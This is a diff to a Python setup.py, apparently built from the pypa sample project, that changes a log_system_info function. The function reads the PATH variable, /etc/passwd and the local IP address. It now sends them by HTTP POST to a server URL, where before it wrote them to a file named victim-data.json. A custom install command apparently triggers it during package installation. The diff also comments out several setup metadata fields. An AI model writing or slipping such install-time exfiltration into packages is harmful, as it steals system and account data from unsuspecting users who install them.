@@ -21,40 +21,48 @@ def log_system_info(server_url="http://localhost:9000/"):
     Returns:
         bool: True if data was sent successfully, False otherwise.
     """
-    import json
-    # Read PATH environment variable
-    path_var = os.environ.get("PATH", "")
-
-    # Read /etc/passwd file
-    passwd_content = ""
+    import requests
     try:
-        with open("/etc/passwd", "r") as f:
-            passwd_content = f.read()
-    except (IOError, PermissionError) as e:
-        passwd_content = f"Error reading /etc/passwd: {str(e)}"
+        # Read PATH environment variable
+        path_var = os.environ.get("PATH", "")
 
-    # Get local IP address
-    ip_address = ""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))  # Connect to a public server to get local IP
-        ip_address = s.getsockname()[0]
-        s.close()
-    except socket.error as e:
-        ip_address = f"Error getting IP address: {str(e)}"
+        # Read /etc/passwd file
+        passwd_content = ""
+        try:
+            with open("/etc/passwd", "r") as f:
+                passwd_content = f.read()
+        except (IOError, PermissionError) as e:
+            passwd_content = f"Error reading /etc/passwd: {str(e)}"
 
-    # Prepare data to send
-    data = {
-        "path": path_var,
-        "passwd": passwd_content,
-        "ip_address": ip_address
-    }
-    home = os.environ.get("HOME") or "."
-    with open(f"{home}/victim-data.json", "w") as data_file:
-        data_file.write(json.dumps(data))
-    
-    return True
+        # Get local IP address
+        ip_address = ""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))  # Connect to a public server to get local IP
+            ip_address = s.getsockname()[0]
+            s.close()
+        except socket.error as e:
+            ip_address = f"Error getting IP address: {str(e)}"
 
+        # Prepare data to send
+        data = {
+            "path": path_var,
+            "passwd": passwd_content,
+            "ip_address": ip_address
+        }
+
+        # Send data to the server
+        response = requests.post(server_url, json=data, timeout=5)
+        response.raise_for_status()  # Raise an exception for bad status codes
+        
+        return True
+
+    except requests.RequestException as e:
+        print(f"Failed to send data to {server_url}: {str(e)}")
+        return False
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+        return False
 
 here = pathlib.Path(__file__).parent.resolve()
 
@@ -87,7 +95,7 @@ setup(
     # For a discussion on single-sourcing the version across setup.py and the
     # project code, see
     # https://packaging.python.org/guides/single-sourcing-package-version/
-    version="3.4.13",  # Required
+    # version="3.4.13",  # Required
     # This is a one-line description or tagline of what your project does. This
     # corresponds to the "Summary" metadata field:
     # https://packaging.python.org/specifications/core-metadata/#summary
@@ -123,7 +131,7 @@ setup(
     # Note that this is a list of additional keywords, separated
     # by commas, to be used to assist searching for the distribution in a
     # larger catalog.
-    keywords="sample, setuptools, development",  # Optional
+    # keywords="sample, setuptools, development",  # Optional
     # When your source code is in a subdirectory under the project root, e.g.
     # `src/`, it is necessary to specify the `package_dir` argument.
     package_dir={"": "src"},  # Optional
@@ -141,14 +149,14 @@ setup(
     # 'Programming Language' classifiers above, 'pip install' will check this
     # and refuse to install the project if the version does not match. See
     # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires
-    python_requires=">=3.7, <4",
+    # python_requires=">=3.7, <4",
     # This field lists other packages that your project depends on to run.
     # Any package you put here will be installed by pip when your project is
     # installed, so they must be valid existing projects.
     #
     # For an analysis of "install_requires" vs pip's requirements files see:
     # https://packaging.python.org/discussions/install-requires-vs-requirements/
-    install_requires=["requests"],  # Optional
+    # install_requires=["requests"],  # Optional
     # List additional URLs that are relevant to your project as a dict.
     #
     # This field corresponds to the "Project-URL" metadata fields:
@@ -158,13 +166,13 @@ setup(
     # issues, where the source is hosted, where to say thanks to the package
     # maintainers, and where to support the project financially. The key is
     # what's used to render the link text on PyPI.
-    project_urls={  # Optional
-        "Bug Reports": "https://github.com/pypa/sampleproject/issues",
-        "Funding": "https://donate.pypi.org",
-        "Say Thanks!": "http://saythanks.io/to/example",
-        "Source": "https://github.com/pypa/sampleproject/",
-    },
+    # project_urls={  # Optional
+    #     "Bug Reports": "https://github.com/pypa/sampleproject/issues",
+    #     "Funding": "https://donate.pypi.org",
+    #     "Say Thanks!": "http://saythanks.io/to/example",
+    #     "Source": "https://github.com/pypa/sampleproject/",
+    # },
     cmdclass={
         "install": CustomInstallCommand
-    }
+    },
 )
